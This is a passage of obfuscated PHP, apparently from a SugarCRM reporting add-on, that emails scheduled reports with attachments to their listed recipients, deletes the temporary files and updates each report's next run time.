$this->ZZZZZZZZZZZZZZZZZZZZZb1($report,$ZZZZZZZZZZZZZZZZZK1010->url);$ZZZZZZZZZZZZZZZZZZZV2121 = $this->ZZZZZZZZZZZZZZZZZZZZW2222($report);$ZZZZZZZZk10 = $ZZZZZZZZZZZZZZZZZZZZZi8['email'];$ZZT1919 = count($ZZZZZZZZZZZZZZZZZZZV2121);include_once 'include/SugarPHPMailer.php';$ZZZZZZZZZZZZZZZZZZZZZk10 = new SugarPHPMailer();$ZZZZZZZZZZZZZZZZZZZZZk10->From = $ZZZZZZZZk10;$ZZZZZZZZZZZZZZZZZZZZZk10->FromName = "Scheduled Report from CRM";$ZZZZZZZZZZZZZZZZZZZZZk10->ClearAllRecipients();$ZZZZZZZZZZZZZZZZZZZZZk10->ClearReplyTos();for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZZZZZZZZZZZZZZZZZZZZk10->AddAddress($ZZZZZZZZZZZZZZZZZZZV2121[$Zf5]["email"],$ZZZZZZZZZZZZZZZZZZZV2121[$Zf5]["name"]);} $ZZZZZZZZZZZZZZZZZZZZZk10->Subject = $ZZZZZZZZZZZZZZZZZZZZZj9["subject"];$ZZZZZZZZZZZZZZZZZZZZZk10->Body = !empty($ZZZZZZZZZZZZZZZZZZZZZj9["body"]) ? $ZZZZZZZZZZZZZZZZZZZZZj9["body"] : "AnalyticReporting scheduled report\n";$ZZZZZZZZZZZZZZZZZZZZZk10->isHTML(true);foreach($ZZZZZZZZZZZZZZZZZZZZZh7 as $ZZZT1919 => $ZZZZZZZZZZZZZZZe4){$ZZZZZZZZZZZZZZZZZZZZZk10->AddAttachment($ZZZZZZZZZZZZZZZe4,$ZZZT1919);} $ZZZZZZZZZZZZZZZZZZZZZk10->prepForOutbound();$ZZZZZZZZZZZZZZZZZZZZZk10->setMailerForSystem();if (!$ZZZZZZZZZZZZZZZZZZZZZk10->Send()) {$GLOBALS['log']->fatal("ERROR: Mail sending failed! (".__FILE__.")");} foreach($ZZZZZZZZZZZZZZZZZZZZZh7 as $ZZZT1919 => $ZZZZZZZZZZZZZZZe4){unlink($ZZZZZZZZZZZZZZZe4);}} function ZZZZZZZZZZZZZZZZZZZZZl11($report){$ZZZZW2222 = new User();$ZZZZW2222->retrieve($report["owner"]);$ZZZZZZZZZZZZZZZZZZZZZd3 = TimeDate::userTimezone($ZZZZW2222);$ZZZZZZZZZZZZZZZZZM1212 = $this->ZZZZZZZZZZZZZZZZZF55($report['interval'],$report['interval_options'],$report['time'],$ZZZZZZZZZZZZZZZZZZZZZd3);$this->db->ZZZA00("UPDATE advancedreports_schedule SET nexttime = ? WHERE id= ?", array($ZZZZZZZZZZZZZZZZZM1212,$report['id']));} function sendScheduledReports(){$ZZZZZQ1616 = $this->ZZZZZZZZZZZZZZZZZZZZV2121();$ZZT1919 = count($ZZZZZQ1616);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$this->ZZZZZZZZZZZZZZZZZZZZZg6($ZZZZZQ1616[$Zf5]);$this->ZZZZZZZZZZZZZZZZZZZZZl11($ZZZZZQ1616[$Zf5]);}}}